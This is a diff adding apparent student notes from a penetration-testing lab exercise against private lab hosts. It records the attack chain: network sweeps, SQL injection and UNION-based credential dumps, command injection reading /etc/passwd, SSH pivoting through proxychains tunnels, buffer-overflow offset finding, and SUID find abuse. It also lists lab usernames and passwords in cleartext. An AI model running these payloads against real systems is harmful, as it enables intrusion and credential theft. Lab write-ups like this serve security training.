@@ -1,0 +1,161 @@
+## FROM OP STATION ##
+10.50.12.32/classinfo.html
+
+user: GETO-M-503		
+pass: PJqY52Yph9tc
+jump: 10.50.13.204
+
+
+First Target hostname: PublicFacingWebsite
+
+Recon
+
+find potential attack vectors
+potential phishing targets, website directory structure, and hidden pages.
+Actively scan and interact with target to find potential attack vectors
+
+for i in {1..254} ;do (ping -c 1 10.50.13.$i | grep "bytes from" &) 2>/dev/null ;done
+nmap -T4 10.50.13.204 (22,53,80)
+wget -r http://10.50.13.204:80
+/getcareers.php?myfile=Web_Server_Admin.html			Web Server Administrator/Engineer
+/getcareers.php?myfile=Systems_engineer.html			Systems Engineer 3
+/getcareers.php?myfile=Executive_Assistant.html			Executive Assistant		
+
+from wget 10.50.13.204 folder cat login.php
+username,passwd
+
+At login page I used 'OR 1=1' on username and password
+Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/login.php on line 20
+Username or Password is incorrect
+
+nmap --script=http-Enum 10.50.13.204 80
+
+'OR 1='1
+'OR 1='1
+
+; whoami		jjj-qngn  ROT13  www-data
+; pwd			/ine/jjj/ugzy ROT13  /var/www/html
+
+; cat /etc/passwd = Passwords
+
+ROT13
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/sh
+ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
+user2:x:1002:1003::/home/user2:/bin/sh
+
+; ls /home = Users
+
+hohagh
+hfre2
+ROT13
+ubuntu
+user2
+
+; ls /var/www/html/scripts   			# I found development.py
+
+; cat /var/www/html/scripts/development.py	# looks like is encrypted in rot13
+
+www-data
+system_user=user2
+user_password=TurkeyDay24
+
+ssh user2@10.50.13.204
+pass: TurkeyDay24
+
+PublicFacingWebsite session>
+
+ip a = 10.10.28.20/27 Range (1-30)
+for i in {1..30} ;do (ping -c 1 10.10.28.$i | grep "bytes from" &) 2>/dev/null ;done
+10.10.28.1, 10.10.28.20
+cat /etc/hosts					# gives 192.168.28.175 BestWebApp
+sudo -l 					# I can only execute /var/tmp/exploit_me
+I can use Web Exploit
+scp user2@10.50.13.204:/var/tmp/exploit_me .	# I download the file into my current directory
+From Ops Analyze:
+strings exploit_me
+chmod u+x exploit_me
+gdb exploit_me
+info functions, run, info functions again	# If warning this is not running appear, execute break main, run
+EIP: 0x804918e
+
+create vi web.py, add:
+
+#!/usr/bin/env python
+	offset = "A" * 100
+	print(offset)
+
+Go into wiremask and generate pattern of 100 and copy/paste into web.py
+offset = "A" * 100
+
+Run gdb and use this command:
+
+run <<<$(python ./web.py)			# It will say warning: not running, to fix this
+break main
+run <<<$(python ./web.py)			# Now it should work, EIP: 0x804918e
+
+
+
+ssh -MS /tmp/jump user2@10.50.13.204 -fN 2>/dev/null
+ssh -S /tmp/jump j -O forward -D 9050
+proxychains nmap 10.10.28.1
+proxychains nmap 10.10.28.20 (22,80)
+proxychains nmap 192.168.28.175			# gives 2222(ssh),8000(http)
+
+ssh -S /tmp/jump j -O forward -L 52730:192.168.28.175:8000
+On Firefox: 127.0.0.1:52730
+product=7 OR 1=1
+=7 Union Select 1,2,3 #                              	 	 ## Means it has 3 columns, also the order is 1,3,2
+Union Select table_schema,table_name,column_name From information_schema.columns # 		
+
+## Golden syntax, I got : mysql, siteusers, performance_schema, information_schema as the Main schemas 
+
+ Union Select user_id, username, name From siteusers.users #		## Gave me usernames with encoded passwords
+ 
+ I go to cyberchef from ROT13 and converted the passwords, results were this:
+
+	Aaron		$appleBottomJ3an$			Windows
+	user2 		$TurkeyDay24				Public Facing Website
+ 	user3 		$Bob4THEPin3apples			Round Sensor
+	Lee_Roth 	$Yebgu					
+	Lroth 		$anotherpassword4THEages
+
+
+Union Select Db,host,3 From mysql.user #
+
+root 	localhost 	$
+webuser localhost 	$*BF207353FF1EAA9EBA7DD87E37E6D278746F17CD
+
+for i in {1..255} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null ;done
+
+192.168.28.165 ports 22,8888(this looks like is down)
+
+Ssh into user3 from user2 session
+ssh user3@192.168.28.165 Bob4THEPin3apples
+
+FROM USER3@SENSOR ROUND
+
+for i in {1..255} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null ;done
+
+I got a new IP : 192.168.28.189
+
+ssh Aaron@192.168.28.189
+appleBottomJ3an$
+
+find / -type f -perm /2000 -ls 2>/dev/null		# Tells me I can used find
+find /path/to/input-file -exec cat {} \;		# Reads
+find / -fprintf /path/to/output-file DATA -quit		# Writes
+
+xfreerdp /u:Aaron /v:localhost:52750 /dynamic-resolution +clipboard
+
+
+
+
+
+#From MariaDB session
+show sessions;
+show tables;
+select * from user;		#Gives Aaron, user2, user3, Lroth and their passwords
+
+
+
